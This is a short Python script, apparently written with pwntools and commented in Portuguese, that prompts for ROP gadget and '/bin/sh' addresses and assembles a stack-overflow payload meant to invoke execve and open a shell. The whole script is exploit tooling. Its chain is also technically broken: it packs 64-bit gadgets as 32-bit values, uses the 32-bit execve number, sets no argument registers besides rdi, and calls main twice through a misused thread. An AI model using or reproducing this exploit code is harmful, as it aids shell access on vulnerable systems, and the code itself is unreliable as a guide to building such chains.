from pwn import *
import threading

def getaddr(prompt):
    return p32(int(input(prompt), 16))

def main():
    print("[>] insira os endereçod de gadgets e functions!\n")

    try:
        # Solicitar o endereço do gadget 'pop rbp'
        pop_rbp = getaddr("rndereço do gadget pop rbp (em hexadecimal): ")

        # Solicitar o endereço do gadget 'ret' (ajustar conforme necessário)
        ret = getaddr("endereço do gadget ret (em hexadecimal): ")

        # Solicitar o endereço do gadget 'ret 0x2f' (ajustar conforme necessário)
        ret_0x2f = getaddr("endereço do gadget ret 0x2f (em hexadecimal): ")

        # Solicitar o endereço da string '/bin/sh'
        bin_sh = getaddr("endereço da string '/bin/sh' (em hexadecimal): ")

        # Solicitar o endereço do gadget 'pop rdi' (se necessário)
        pop_rdi = getaddr("endereço do gadget pop rdi (em hexadecimal): ")

        # Solicitar o endereço do gadget 'pop rax' (se necessário)
        pop_rax = getaddr("endereço do gadget pop rax (em hexadecimal): ")

        # Solicitar o endereço do gadget 'syscall' (se necessário)
        syscall = getaddr("endereço do gadget syscall (em hexadecimal)")
    except KeyboardInterrupt:
        print("\n   >> Bye!\n")

    payload = b'A' * 64
    payload += pop_rdi
    payload += bin_sh
    payload += pop_rax
    payload += p32(0x0b)
    payload += syscall

    print("[+] payload gerado! ")
    print(payload)

if __name__ == "__main__":
    main()

threading.Thread(target=main()).start()




